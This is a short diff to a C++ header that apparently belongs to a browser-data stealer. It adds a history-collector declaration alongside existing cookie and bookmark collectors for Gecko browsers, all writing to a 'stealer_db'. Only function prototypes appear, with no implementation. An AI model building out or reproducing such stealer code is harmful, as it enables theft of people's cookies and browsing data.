@@ -13,5 +13,6 @@ BOOL gecko_parser(std::string username, std::string stealer_db);
 BOOL gecko_cookie_collector(std::string username, std::string stealer_db);
 std::string get_gecko_program_dir(std::string target_user_data);
 BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db);
+BOOL gecko_history_collector(std::string username, std::string stealer_db);
 
 #endif /* GECKOPARSER_H */
